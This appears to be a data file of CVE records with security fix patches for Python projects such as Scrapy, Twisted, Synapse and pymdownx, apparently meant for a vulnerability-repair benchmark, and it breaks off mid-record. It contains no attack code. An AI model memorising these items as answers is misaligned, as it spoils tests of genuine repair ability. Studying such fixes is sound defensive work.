{"cve":"CVE-2021-39163:0708", "fix_patch": "diff --git a/synapse/groups/groups_server.py b/synapse/groups/groups_server.py\nindex 3dc55ab86..392bb05ac 100644\n--- a/synapse/groups/groups_server.py\n+++ b/synapse/groups/groups_server.py\n@@ -332,6 +332,12 @@ class GroupsServerWorkerHandler:\n             requester_user_id, group_id\n         )\n \n+        # We don't allow viewing rooms in a group if you're not in it.\n+        if not is_user_in_group:\n+            # We return empty lists so that we don't leak whether a group\n+            # exists or not.\n+            return {\"chunk\": [], \"total_room_count_estimate\": 0}\n+\n         room_results = await self.store.get_rooms_in_group(\n             group_id, include_private=is_user_in_group\n         )\n"}
{"cve":"CVE-2022-0577:0708", "fix_patch": "diff --git a/scrapy/downloadermiddlewares/redirect.py b/scrapy/downloadermiddlewares/redirect.py\nindex 4053fecc5..9ccf7dc96 100644\n--- a/scrapy/downloadermiddlewares/redirect.py\n+++ b/scrapy/downloadermiddlewares/redirect.py\n@@ -50,6 +50,8 @@ class BaseRedirectMiddleware:\n         redirected = request.replace(url=redirect_url, method='GET', body='')\n         redirected.headers.pop('Content-Type', None)\n         redirected.headers.pop('Content-Length', None)\n+        if urlparse(request.url).hostname != urlparse(redirect_url).hostname:\n+            redirected.headers.pop('Authorization', None)\n         return redirected\n \n \n@@ -81,6 +83,8 @@ class RedirectMiddleware(BaseRedirectMiddleware):\n \n         if response.status in (301, 307, 308) or request.method == 'HEAD':\n             redirected = request.replace(url=redirected_url)\n+            if urlparse(request.url).hostname != urlparse(redirected.url).hostname:\n+                redirected.headers.pop('Authorization', None)\n             return self._redirect(redirected, request, spider, response.status)\n \n         redirected = self._redirect_request_using_get(request, redirected_url)\n"}
{"cve":"CVE-2021-41125:0708", "fix_patch": "diff --git a/scrapy/downloadermiddlewares/httpauth.py b/scrapy/downloadermiddlewares/httpauth.py\nindex 7aa7a62bc..35610946f 100644\n--- a/scrapy/downloadermiddlewares/httpauth.py\n+++ b/scrapy/downloadermiddlewares/httpauth.py\n@@ -4,6 +4,8 @@ HTTP basic auth downloader middleware\n See documentation in docs/topics/downloader-middleware.rst\n \"\"\"\n \n+from urllib.parse import urlparse\n+\n from w3lib.http import basic_auth_header\n \n from scrapy import signals\n@@ -24,8 +26,13 @@ class HttpAuthMiddleware(object):\n         pwd = getattr(spider, 'http_pass', '')\n         if usr or pwd:\n             self.auth = basic_auth_header(usr, pwd)\n+            self.auth_domain = getattr(spider, 'http_auth_domain', None)\n \n     def process_request(self, request, spider):\n         auth = getattr(self, 'auth', None)\n         if auth and b'Authorization' not in request.headers:\n-            request.headers[b'Authorization'] = auth\n+            auth_domain = getattr(self, 'auth_domain', None)\n+            if auth_domain:\n+                domain = urlparse(request.url).hostname\n+                if domain and domain == auth_domain:\n+                    request.headers[b'Authorization'] = auth\n"}
{"cve":"CVE-2021-21360:0708", "fix_patch": "diff --git a/src/Products/GenericSetup/context.py b/src/Products/GenericSetup/context.py\nindex 1c8ba1d..1ff2f6d 100644\n--- a/src/Products/GenericSetup/context.py\n+++ b/src/Products/GenericSetup/context.py\n@@ -559,6 +559,10 @@ class SnapshotExportContext(BaseContext):\n             if element not in current.objectIds():\n                 # No Unicode IDs!\n                 current._setObject(str(element), Folder(element))\n+                folder = current._getOb(element)\n+                # Manager/Owner can do everything, but we want to deny\n+                # anonymous View.\n+                folder.manage_permission('View', ['Manager'], 0)\n \n             current = current._getOb(element)\n \n"}
{"cve":"CVE-2023-32303:0708", "fix_patch": "diff --git a/planet/auth.py b/planet/auth.py\nindex e50f1af..1964a30 100644\n--- a/planet/auth.py\n+++ b/planet/auth.py\n@@ -240,7 +240,9 @@ class _SecretFile:\n \n     def _write(self, contents: dict):\n         LOGGER.debug(f'Writing to {self.path}')\n-        with open(self.path, 'w') as fp:\n+        flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC\n+        mode = 0o600\n+        with os.fdopen(os.open(self.path, flags, mode), 'w') as fp:\n             fp.write(json.dumps(contents))\n \n     def read(self) -> dict:\n"}
{"cve":"CVE-2022-21712:0708", "fix_patch": "diff --git a/src/twisted/web/client.py b/src/twisted/web/client.py\nindex a1295c2705..edc355973f 100644\n--- a/src/twisted/web/client.py\n+++ b/src/twisted/web/client.py\n@@ -12,7 +12,7 @@ import os\n import warnings\n import zlib\n from functools import wraps\n-from urllib.parse import urldefrag, urljoin, urlunparse as _urlunparse\n+from urllib.parse import urldefrag, urljoin, urlparse, urlunparse as _urlunparse\n \n from zope.interface import implementer\n \n@@ -2169,6 +2169,44 @@ class RedirectAgent:\n         \"\"\"\n         return _urljoin(requestURI, location)\n \n+\n+    def _redirectHeaders(self, uri, location, headers):\n+        \"\"\"\n+        Return headers suitable for a redirect to the given location.\n+\n+        Specifically, this removes authentication and cookie headers if the\n+        redirect is cross-origin.\n+\n+        @type uri: L{bytes}\n+        @param uri: The original request URI.\n+\n+        @type location: L{bytes}\n+        @param location: The redirect location URI.\n+\n+        @type headers: L{Headers} or L{None}\n+        @param headers: The original request headers.\n+\n+        @return: The headers to use for the redirect request.\n+        @rtype: L{Headers} or L{None}\n+        \"\"\"\n+        if headers is None:\n+            return None\n+\n+        p_uri = urlparse(uri)\n+        p_location = urlparse(location)\n+\n+        if (p_uri.scheme, p_uri.hostname, p_uri.port) != (\n+            p_location.scheme,\n+            p_location.hostname,\n+            p_location.port,\n+        ):\n+            headers = headers.copy()\n+            for name in (b\"authorization\", b\"cookie\"):\n+                if headers.hasHeader(name):\n+                    headers.removeHeader(name)\n+        return headers\n+\n+\n     def _handleRedirect(self, response, method, uri, headers, redirectCount):\n         \"\"\"\n         Handle a redirect response, checking the number of redirects already\n@@ -2186,7 +2224,8 @@ class RedirectAgent:\n             )\n             raise ResponseFailed([Failure(err)], response)\n         location = self._resolveLocation(uri, locationHeaders[0])\n-        deferred = self._agent.request(method, location, headers)\n+        redirectHeaders = self._redirectHeaders(uri, location, headers)\n+        deferred = self._agent.request(method, location, redirectHeaders)\n \n         def _chainResponse(newResponse):\n             newResponse.setPreviousResponse(response)\n@@ -2205,9 +2244,13 @@ class RedirectAgent:\n             if method not in (b\"GET\", b\"HEAD\"):\n                 err = error.PageRedirect(response.code, location=uri)\n                 raise ResponseFailed([Failure(err)], response)\n-            return self._handleRedirect(response, method, uri, headers, redirectCount)\n+            return self._handleRedirect(\n+                response, method, uri, headers, redirectCount + 1\n+            )\n         elif response.code in self._seeOtherResponses:\n-            return self._handleRedirect(response, b\"GET\", uri, headers, redirectCount)\n+            return self._handleRedirect(\n+                response, b\"GET\", uri, headers, redirectCount\n+            )\n         return response\n \n \n"}
{"cve":"CVE-2022-4724:0708", "fix_patch": "diff --git a/rdiffweb/core/model/__init__.py b/rdiffweb/core/model/__init__.py\nindex df13f84..2faf792 100644\n--- a/rdiffweb/core/model/__init__.py\n+++ b/rdiffweb/core/model/__init__.py\n@@ -100,24 +100,7 @@ def db_after_create(target, connection, **kw):\n     if getattr(connection, '_transaction', None):\n         connection._transaction.commit()\n \n-    # Remove preceding and leading slash (/) generated by previous\n-    # versions. Also rename '.' to ''\n-    result = RepoObject.query.all()\n-    for row in result:\n-        if row.repopath.startswith('/') or row.repopath.endswith('/'):\n-            row.repopath = row.repopath.strip('/')\n-            row.commit()\n-        if row.repopath == '.':\n-            row.repopath = ''\n-            row.commit()\n-    # Remove duplicates and nested repositories.\n-    result = RepoObject.query.order_by(RepoObject.userid, RepoObject.repopath).all()\n-    prev_repo = (None, None)\n-    for row in result:\n-        if prev_repo[0] == row.userid and (prev_repo[1] == row.repopath or row.repopath.startswith(prev_repo[1] + '/')):\n-            row.delete()\n-        else:\n-            prev_repo = (row.userid, row.repopath)\n+\n \n     # Fix username case insensitive unique\n     if not _index_exists(connection, 'user_username_index'):\ndiff --git a/rdiffweb/core/model/_user.py b/rdiffweb/core/model/_user.py\nindex 9b06363..57b01e2 100644\n--- a/rdiffweb/core/model/_user.py\n+++ b/rdiffweb/core/model/_user.py\n@@ -164,23 +164,12 @@ class UserObject(Base):\n             options=None, keytype=key.keytype, key=key.key, comment=comment or key.comment\n         )\n \n-        # If a filename exists, use it by default.\n-        filename = os.path.join(self.user_root, '.ssh', 'authorized_keys')\n-        if os.path.isfile(filename):\n-            with open(filename, mode=\"r+\", encoding='utf-8') as fh:\n-                if authorizedkeys.exists(fh, key):\n-                    raise DuplicateSSHKeyError(_(\"SSH key already exists\"))\n-                logger.info(\"add key [%s] to [%s] authorized_keys\", key, self.username)\n-                authorizedkeys.add(fh, key)\n-        else:\n-            # Also look in database.\n-            logger.info(\"add key [%s] to [%s] database\", key, self.username)\n-            try:\n-                SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue()).add().flush()\n-            except IntegrityError:\n-                raise DuplicateSSHKeyError(\n-                    _(\"Duplicate key. This key already exists or is associated to another user.\")\n-                )\n+        try:\n+            SshKey(userid=self.userid, fingerprint=key.fingerprint, key=key.getvalue()).add().flush()\n+        except IntegrityError:\n+            raise DuplicateSSHKeyError(\n+                _(\"Duplicate key. This key already exists or is associated to another user.\")\n+            ) from None\n         cherrypy.engine.publish('user_attr_changed', self, {'authorizedkeys': True})\n         cherrypy.engine.publish('authorizedkey_added', self, fingerprint=key.fingerprint, comment=comment)\n \n"}
{"cve":"CVE-2023-32309:0708", "fix_patch": "diff --git a/docs/public.txt b/docs/public.txt\nnew file mode 100644\nindex 00000000..c87add5d\n--- /dev/null\n+++ b/docs/public.txt\n@@ -0,0 +1 @@\n+public content\ndiff --git a/pymdownx/snippets.py b/pymdownx/snippets.py\nindex e7ae2e98..f6e0591c 100644\n--- a/pymdownx/snippets.py\n+++ b/pymdownx/snippets.py\n@@ -1,403 +1,407 @@\n-\"\"\"\n-Snippet ---8<---.\n-\n-pymdownx.snippet\n-Inject snippets\n-\n-MIT license.\n-\n-Copyright (c) 2017 Isaac Muse <isaacmuse@gmail.com>\n-\n-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\n-documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation\n-the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,\n-and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n-\n-The above copyright notice and this permission notice shall be included in all copies or substantial portions\n-of the Software.\n-\n-THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED\n-TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n-THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\n-CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n-DEALINGS IN THE SOFTWARE.\n-\"\"\"\n-from markdown import Extension\n-from markdown.preprocessors import Preprocessor\n-import functools\n-import urllib\n-import re\n-import codecs\n-import os\n-from . import util\n-import textwrap\n-\n-MI = 1024 * 1024  # mebibyte (MiB)\n-DEFAULT_URL_SIZE = MI * 32\n-DEFAULT_URL_TIMEOUT = 10.0  # in seconds\n-DEFAULT_URL_REQUEST_HEADERS = {}\n-\n-\n-class SnippetMissingError(Exception):\n-    \"\"\"Snippet missing exception.\"\"\"\n-\n-\n-class SnippetPreprocessor(Preprocessor):\n-    \"\"\"Handle snippets in Markdown content.\"\"\"\n-\n-    RE_ALL_SNIPPETS = re.compile(\n-        r'''(?x)\n-        ^(?P<space>[ \\t]*)\n-        (?P<escape>;*)\n-        (?P<all>\n-            (?P<inline_marker>-{1,}8<-{1,}[ \\t]+)\n-            (?P<snippet>(?:\"(?:\\\\\"|[^\"\\n\\r])+?\"|'(?:\\\\'|[^'\\n\\r])+?'))(?![ \\t]) |\n-            (?P<block_marker>-{1,}8<-{1,})(?![ \\t])\n-        )\\r?$\n-        '''\n-    )\n-\n-    RE_SNIPPET = re.compile(\n-        r'''(?x)\n-        ^(?P<space>[ \\t]*)\n-        (?P<snippet>.*?)\\r?$\n-        '''\n-    )\n-\n-    RE_SNIPPET_SECTION = re.compile(\n-        r'''(?xi)\n-        ^(?P<pre>.*?)\n-        (?P<escape>;*)\n-        (?P<inline_marker>-{1,}8<-{1,}[ \\t]+)\n-        (?P<section>\\[[ \\t]*(?P<type>start|end)[ \\t]*:[ \\t]*(?P<name>[a-z][-_0-9a-z]*)[ \\t]*\\])\n-        (?P<post>.*?)$\n-        '''\n-    )\n-\n-    RE_SNIPPET_FILE = re.compile(r'(?i)(.*?)(?:(:[0-9]*)?(:[0-9]*)?|(:[a-z][-_0-9a-z]*)?)$')\n-\n-    def __init__(self, config, md):\n-        \"\"\"Initialize.\"\"\"\n-\n-        base = config.get('base_path')\n-        if isinstance(base, str):\n-            base = [base]\n-        self.base_path = base\n-        self.encoding = config.get('encoding')\n-        self.check_paths = config.get('check_paths')\n-        self.auto_append = config.get('auto_append')\n-        self.url_download = config['url_download']\n-        self.url_max_size = config['url_max_size']\n-        self.url_timeout = config['url_timeout']\n-        self.url_request_headers = config['url_request_headers']\n-        self.dedent_subsections = config['dedent_subsections']\n-        self.tab_length = md.tab_length\n-        super(SnippetPreprocessor, self).__init__()\n-\n-    def extract_section(self, section, lines):\n-        \"\"\"Extract the specified section from the lines.\"\"\"\n-\n-        new_lines = []\n-        start = False\n-        found = False\n-        for l in lines:\n-\n-            # Found a snippet section marker with our specified name\n-            m = self.RE_SNIPPET_SECTION.match(l)\n-\n-            # Handle escaped line\n-            if m and start and m.group('escape'):\n-                l = (\n-                    m.group('pre') + m.group('escape').replace(';', '', 1) + m.group('inline_marker') +\n-                    m.group('section') + m.group('post')\n-                )\n-\n-            # Found a section we are looking for.\n-            elif m is not None and m.group('name') == section:\n-\n-                # We found the start\n-                if not start and m.group('type') == 'start':\n-                    start = True\n-                    found = True\n-                    continue\n-\n-                # Ignore duplicate start\n-                elif start and m.group('type') == 'start':\n-                    continue\n-\n-                # We found the end\n-                elif start and m.group('type') == 'end':\n-                    start = False\n-                    break\n-\n-                # We found an end, but no start\n-                else:\n-                    break\n-\n-            # Found a section we don't care about, so ignore it.\n-            elif m and start:\n-                continue\n-\n-            # We are currently in a section, so append the line\n-            if start:\n-                new_lines.append(l)\n-\n-        if not found and self.check_paths:\n-            raise SnippetMissingError(\"Snippet section '{}' could not be located\".format(section))\n-\n-        return self.dedent(new_lines) if self.dedent_subsections else new_lines\n-\n-    def dedent(self, lines):\n-        \"\"\"De-indent lines.\"\"\"\n-\n-        return textwrap.dedent('\\n'.join(lines)).split('\\n')\n-\n-    def get_snippet_path(self, path):\n-        \"\"\"Get snippet path.\"\"\"\n-\n-        snippet = None\n-        for base in self.base_path:\n-            if os.path.exists(base):\n-                if os.path.isdir(base):\n-                    filename = os.path.join(base, path)\n-                    if os.path.exists(filename):\n-                        snippet = filename\n-                        break\n-                else:\n-                    basename = os.path.basename(base)\n-                    dirname = os.path.dirname(base)\n-                    if basename.lower() == path.lower():\n-                        filename = os.path.join(dirname, path)\n-                        if os.path.exists(filename):\n-                            snippet = filename\n-                            break\n-        return snippet\n-\n-    @functools.lru_cache()\n-    def download(self, url):\n-        \"\"\"\n-        Actually download the snippet pointed to by the passed URL.\n-\n-        The most recently used files are kept in a cache until the next reset.\n-        \"\"\"\n-\n-        http_request = urllib.request.Request(url, headers=self.url_request_headers)\n-        timeout = None if self.url_timeout == 0 else self.url_timeout\n-        with urllib.request.urlopen(http_request, timeout=timeout) as response:\n-\n-            # Fail if status is not OK\n-            status = response.status if util.PY39 else response.code\n-            if status != 200:\n-                raise SnippetMissingError(\"Cannot download snippet '{}'\".format(url))\n-\n-            # We provide some basic protection against absurdly large files.\n-            # 32MB is chosen as an arbitrary upper limit. This can be raised if desired.\n-            length = response.headers.get(\"content-length\")\n-            if length is None:\n-                raise ValueError(\"Missing content-length header\")\n-            content_length = int(length)\n-\n-            if self.url_max_size != 0 and content_length >= self.url_max_size:\n-                raise ValueError(\"refusing to read payloads larger than or equal to {}\".format(self.url_max_size))\n-\n-            # Nothing to return\n-            if content_length == 0:\n-                return ['']\n-\n-            # Process lines\n-            return [l.decode(self.encoding).rstrip('\\r\\n') for l in response.readlines()]\n-\n-    def parse_snippets(self, lines, file_name=None, is_url=False):\n-        \"\"\"Parse snippets snippet.\"\"\"\n-\n-        if file_name:\n-            # Track this file.\n-            self.seen.add(file_name)\n-\n-        new_lines = []\n-        inline = False\n-        block = False\n-        for line in lines:\n-            # Check for snippets on line\n-            inline = False\n-            m = self.RE_ALL_SNIPPETS.match(line)\n-            if m:\n-                if m.group('escape'):\n-                    # The snippet has been escaped, replace first `;` and continue.\n-                    new_lines.append(line.replace(';', '', 1))\n-                    continue\n-\n-                if block and m.group('inline_marker'):\n-                    # Don't use inline notation directly under a block.\n-                    # It's okay if inline is used again in sub file though.\n-                    continue\n-\n-                elif m.group('inline_marker'):\n-                    # Inline\n-                    inline = True\n-\n-                else:\n-                    # Block\n-                    block = not block\n-                    continue\n-\n-            elif not block:\n-                # Not in snippet, and we didn't find an inline,\n-                # so just a normal line\n-                new_lines.append(line)\n-                continue\n-\n-            if block and not inline:\n-                # We are in a block and we didn't just find a nested inline\n-                # So check if a block path\n-                m = self.RE_SNIPPET.match(line)\n-\n-            if m:\n-                # Get spaces and snippet path.  Remove quotes if inline.\n-                space = m.group('space').expandtabs(self.tab_length)\n-                path = m.group('snippet')[1:-1].strip() if inline else m.group('snippet').strip()\n-\n-                if not inline:\n-                    # Block path handling\n-                    if not path:\n-                        # Empty path line, insert a blank line\n-                        new_lines.append('')\n-                        continue\n-\n-                # Ignore commented out lines\n-                if path.startswith(';'):\n-                    continue\n-\n-                # Get line numbers (if specified)\n-                end = None\n-                start = None\n-                section = None\n-                m = self.RE_SNIPPET_FILE.match(path)\n-                path = m.group(1).strip()\n-                # Looks like we have an empty file and only lines specified\n-                if not path:\n-                    if self.check_paths:\n-                        raise SnippetMissingError(\"Snippet at path '{}' could not be found\".format(path))\n-                    else:\n-                        continue\n-                ending = m.group(3)\n-                if ending and len(ending) > 1:\n-                    end = int(ending[1:])\n-                starting = m.group(2)\n-                if starting and len(starting) > 1:\n-                    start = max(1, int(starting[1:]) - 1)\n-                section_name = m.group(4)\n-                if section_name:\n-                    section = section_name[1:]\n-\n-                # Ignore path links if we are in external, downloaded content\n-                is_link = path.lower().startswith(('https://', 'http://'))\n-                if is_url and not is_link:\n-                    continue\n-\n-                # If this is a link, and we are allowing URLs, set `url` to true.\n-                # Make sure we don't process `path` as a local file reference.\n-                url = self.url_download and is_link\n-                snippet = self.get_snippet_path(path) if not url else path\n-\n-                if snippet:\n-\n-                    # This is in the stack and we don't want an infinite loop!\n-                    if snippet in self.seen:\n-                        continue\n-\n-                    if not url:\n-                        # Read file content\n-                        with codecs.open(snippet, 'r', encoding=self.encoding) as f:\n-                            s_lines = [l.rstrip('\\r\\n') for l in f]\n-                            if start is not None or end is not None:\n-                                s = slice(start, end)\n-                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]\n-                            elif section:\n-                                s_lines = self.extract_section(section, s_lines)\n-                    else:\n-                        # Read URL content\n-                        try:\n-                            s_lines = self.download(snippet)\n-                            if start is not None or end is not None:\n-                                s = slice(start, end)\n-                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]\n-                            elif section:\n-                                s_lines = self.extract_section(section, s_lines)\n-                        except SnippetMissingError:\n-                            if self.check_paths:\n-                                raise\n-                            s_lines = []\n-\n-                    # Process lines looking for more snippets\n-                    new_lines.extend(\n-                        [\n-                            space + l2 for l2 in self.parse_snippets(\n-                                s_lines,\n-                                snippet,\n-                                is_url=url\n-                            )\n-                        ]\n-                    )\n-\n-                elif self.check_paths:\n-                    raise SnippetMissingError(\"Snippet at path '{}' could not be found\".format(path))\n-\n-        # Pop the current file name out of the cache\n-        if file_name:\n-            self.seen.remove(file_name)\n-\n-        return new_lines\n-\n-    def run(self, lines):\n-        \"\"\"Process snippets.\"\"\"\n-\n-        self.seen = set()\n-        if self.auto_append:\n-            lines.extend(\"\\n\\n-8<-\\n{}\\n-8<-\\n\".format('\\n\\n'.join(self.auto_append)).split('\\n'))\n-\n-        return self.parse_snippets(lines)\n-\n-\n-class SnippetExtension(Extension):\n-    \"\"\"Snippet extension.\"\"\"\n-\n-    def __init__(self, *args, **kwargs):\n-        \"\"\"Initialize.\"\"\"\n-\n-        self.config = {\n-            'base_path': [[\".\"], \"Base path for snippet paths - Default: [\\\".\\\"]\"],\n-            'encoding': [\"utf-8\", \"Encoding of snippets - Default: \\\"utf-8\\\"\"],\n-            'check_paths': [False, \"Make the build fail if a snippet can't be found - Default: \\\"False\\\"\"],\n-            \"auto_append\": [\n-                [],\n-                \"A list of snippets (relative to the 'base_path') to auto append to the Markdown content - Default: []\"\n-            ],\n-            'url_download': [False, \"Download external URLs as snippets - Default: \\\"False\\\"\"],\n-            'url_max_size': [DEFAULT_URL_SIZE, \"External URL max size (0 means no limit)- Default: 32 MiB\"],\n-            'url_timeout': [DEFAULT_URL_TIMEOUT, 'Defualt URL timeout (0 means no timeout) - Default: 10 sec'],\n-            'url_request_headers': [DEFAULT_URL_REQUEST_HEADERS, \"Extra request Headers - Default: {}\"],\n-            'dedent_subsections': [False, \"Dedent subsection extractions e.g. 'sections' and/or 'lines'.\"]\n-        }\n-\n-        super(SnippetExtension, self).__init__(*args, **kwargs)\n-\n-    def extendMarkdown(self, md):\n-        \"\"\"Register the extension.\"\"\"\n-\n-        self.md = md\n-        md.registerExtension(self)\n-        config = self.getConfigs()\n-        snippet = SnippetPreprocessor(config, md)\n-        md.preprocessors.register(snippet, \"snippet\", 32)\n-\n-    def reset(self):\n-        \"\"\"Reset.\"\"\"\n-\n-        self.md.preprocessors['snippet'].download.cache_clear()\n-\n-\n-def makeExtension(*args, **kwargs):\n-    \"\"\"Return extension.\"\"\"\n-\n-    return SnippetExtension(*args, **kwargs)\n+\"\"\"\n+Snippet ---8<---.\n+\n+pymdownx.snippet\n+Inject snippets\n+\n+MIT license.\n+\n+Copyright (c) 2017 Isaac Muse <isaacmuse@gmail.com>\n+\n+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\n+documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation\n+the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,\n+and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n+\n+The above copyright notice and this permission notice shall be included in all copies or substantial portions\n+of the Software.\n+\n+THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED\n+TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n+THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\n+CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n+DEALINGS IN THE SOFTWARE.\n+\"\"\"\n+from markdown import Extension\n+from markdown.preprocessors import Preprocessor\n+import functools\n+import urllib\n+import re\n+import codecs\n+import os\n+from . import util\n+import textwrap\n+\n+MI = 1024 * 1024  # mebibyte (MiB)\n+DEFAULT_URL_SIZE = MI * 32\n+DEFAULT_URL_TIMEOUT = 10.0  # in seconds\n+DEFAULT_URL_REQUEST_HEADERS = {}\n+\n+\n+class SnippetMissingError(Exception):\n+    \"\"\"Snippet missing exception.\"\"\"\n+\n+\n+class SnippetPreprocessor(Preprocessor):\n+    \"\"\"Handle snippets in Markdown content.\"\"\"\n+\n+    RE_ALL_SNIPPETS = re.compile(\n+        r'''(?x)\n+        ^(?P<space>[ \\t]*)\n+        (?P<escape>;*)\n+        (?P<all>\n+            (?P<inline_marker>-{1,}8<-{1,}[ \\t]+)\n+            (?P<snippet>(?:\"(?:\\\\\"|[^\"\\n\\r])+?\"|'(?:\\\\'|[^'\\n\\r])+?'))(?![ \\t]) |\n+            (?P<block_marker>-{1,}8<-{1,})(?![ \\t])\n+        )\\r?$\n+        '''\n+    )\n+\n+    RE_SNIPPET = re.compile(\n+        r'''(?x)\n+        ^(?P<space>[ \\t]*)\n+        (?P<snippet>.*?)\\r?$\n+        '''\n+    )\n+\n+    RE_SNIPPET_SECTION = re.compile(\n+        r'''(?xi)\n+        ^(?P<pre>.*?)\n+        (?P<escape>;*)\n+        (?P<inline_marker>-{1,}8<-{1,}[ \\t]+)\n+        (?P<section>\\[[ \\t]*(?P<type>start|end)[ \\t]*:[ \\t]*(?P<name>[a-z][-_0-9a-z]*)[ \\t]*\\])\n+        (?P<post>.*?)$\n+        '''\n+    )\n+\n+    RE_SNIPPET_FILE = re.compile(r'(?i)(.*?)(?:(:[0-9]*)?(:[0-9]*)?|(:[a-z][-_0-9a-z]*)?)$')\n+\n+    def __init__(self, config, md):\n+        \"\"\"Initialize.\"\"\"\n+\n+        base = config.get('base_path')\n+        if isinstance(base, str):\n+            base = [base]\n+        self.base_path = base\n+        self.encoding = config.get('encoding')\n+        self.check_paths = config.get('check_paths')\n+        self.auto_append = config.get('auto_append')\n+        self.url_download = config['url_download']\n+        self.url_max_size = config['url_max_size']\n+        self.url_timeout = config['url_timeout']\n+        self.url_request_headers = config['url_request_headers']\n+        self.dedent_subsections = config['dedent_subsections']\n+        self.tab_length = md.tab_length\n+        super(SnippetPreprocessor, self).__init__()\n+\n+    def extract_section(self, section, lines):\n+        \"\"\"Extract the specified section from the lines.\"\"\"\n+\n+        new_lines = []\n+        start = False\n+        found = False\n+        for l in lines:\n+\n+            # Found a snippet section marker with our specified name\n+            m = self.RE_SNIPPET_SECTION.match(l)\n+\n+            # Handle escaped line\n+            if m and start and m.group('escape'):\n+                l = (\n+                    m.group('pre') + m.group('escape').replace(';', '', 1) + m.group('inline_marker') +\n+                    m.group('section') + m.group('post')\n+                )\n+\n+            # Found a section we are looking for.\n+            elif m is not None and m.group('name') == section:\n+\n+                # We found the start\n+                if not start and m.group('type') == 'start':\n+                    start = True\n+                    found = True\n+                    continue\n+\n+                # Ignore duplicate start\n+                elif start and m.group('type') == 'start':\n+                    continue\n+\n+                # We found the end\n+                elif start and m.group('type') == 'end':\n+                    start = False\n+                    break\n+\n+                # We found an end, but no start\n+                else:\n+                    break\n+\n+            # Found a section we don't care about, so ignore it.\n+            elif m and start:\n+                continue\n+\n+            # We are currently in a section, so append the line\n+            if start:\n+                new_lines.append(l)\n+\n+        if not found and self.check_paths:\n+            raise SnippetMissingError(\"Snippet section '{}' could not be located\".format(section))\n+\n+        return self.dedent(new_lines) if self.dedent_subsections else new_lines\n+\n+    def dedent(self, lines):\n+        \"\"\"De-indent lines.\"\"\"\n+\n+        return textwrap.dedent('\\n'.join(lines)).split('\\n')\n+\n+    def get_snippet_path(self, path):\n+        \"\"\"Get snippet path.\"\"\"\n+\n+        snippet = None\n+        for base in self.base_path:\n+            if not os.path.isabs(path) and os.path.exists(base):\n+                if os.path.isdir(base):\n+                    abs_base = os.path.abspath(base)\n+                    filename = os.path.join(base, path)\n+                    abs_filename = os.path.abspath(filename)\n+                    if (abs_filename.startswith(abs_base + os.sep) or abs_filename == abs_base) and os.path.exists(filename):\n+                        snippet = filename\n+                        break\n+                else:\n+                    basename = os.path.basename(base)\n+                    dirname = os.path.dirname(base)\n+                    abs_dirname = os.path.abspath(dirname)\n+                    if basename.lower() == path.lower():\n+                        filename = os.path.join(dirname, path)\n+                        abs_filename = os.path.abspath(filename)\n+                        if (abs_filename.startswith(abs_dirname + os.sep) or abs_filename == abs_dirname) and os.path.exists(filename):\n+                            snippet = filename\n+                            break\n+        return snippet\n+\n+    @functools.lru_cache()\n+    def download(self, url):\n+        \"\"\"\n+        Actually download the snippet pointed to by the passed URL.\n+\n+        The most recently used files are kept in a cache until the next reset.\n+        \"\"\"\n+\n+        http_request = urllib.request.Request(url, headers=self.url_request_headers)\n+        timeout = None if self.url_timeout == 0 else self.url_timeout\n+        with urllib.request.urlopen(http_request, timeout=timeout) as response:\n+\n+            # Fail if status is not OK\n+            status = response.status if util.PY39 else response.code\n+            if status != 200:\n+                raise SnippetMissingError(\"Cannot download snippet '{}'\".format(url))\n+\n+            # We provide some basic protection against absurdly large files.\n+            # 32MB is chosen as an arbitrary upper limit. This can be raised if desired.\n+            length = response.headers.get(\"content-length\")\n+            if length is None:\n+                raise ValueError(\"Missing content-length header\")\n+            content_length = int(length)\n+\n+            if self.url_max_size != 0 and content_length >= self.url_max_size:\n+                raise ValueError(\"refusing to read payloads larger than or equal to {}\".format(self.url_max_size))\n+\n+            # Nothing to return\n+            if content_length == 0:\n+                return ['']\n+\n+            # Process lines\n+            return [l.decode(self.encoding).rstrip('\\r\\n') for l in response.readlines()]\n+\n+    def parse_snippets(self, lines, file_name=None, is_url=False):\n+        \"\"\"Parse snippets snippet.\"\"\"\n+\n+        if file_name:\n+            # Track this file.\n+            self.seen.add(file_name)\n+\n+        new_lines = []\n+        inline = False\n+        block = False\n+        for line in lines:\n+            # Check for snippets on line\n+            inline = False\n+            m = self.RE_ALL_SNIPPETS.match(line)\n+            if m:\n+                if m.group('escape'):\n+                    # The snippet has been escaped, replace first `;` and continue.\n+                    new_lines.append(line.replace(';', '', 1))\n+                    continue\n+\n+                if block and m.group('inline_marker'):\n+                    # Don't use inline notation directly under a block.\n+                    # It's okay if inline is used again in sub file though.\n+                    continue\n+\n+                elif m.group('inline_marker'):\n+                    # Inline\n+                    inline = True\n+\n+                else:\n+                    # 